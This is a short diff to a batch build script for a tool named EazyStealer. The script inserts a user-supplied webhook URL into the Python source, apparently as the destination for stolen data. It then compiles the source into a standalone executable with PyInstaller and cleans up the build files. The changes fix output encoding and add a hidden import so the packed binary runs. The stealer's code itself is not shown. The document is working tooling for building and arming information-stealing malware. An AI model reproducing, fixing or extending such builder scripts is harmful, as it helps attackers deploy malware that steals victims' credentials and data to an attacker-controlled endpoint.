@@ -7,9 +7,10 @@ if "%webhook_url%"=="" (
     echo No webhook URL provided. Exiting...
     exit /b
 )
-powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py"
+powershell -Command "(gc EazyStealer.py) -replace 'YOUR_WEBHOOK_URL_HERE', '%webhook_url%' | Out-File EazyStealer.py -Encoding utf8"
 
-python -m PyInstaller --onefile EazyStealer.py
+python -m PyInstaller --onefile --hidden-import=encodings EazyStealer.py
+
 
 del EazyStealer.spec
 rmdir /s /q build
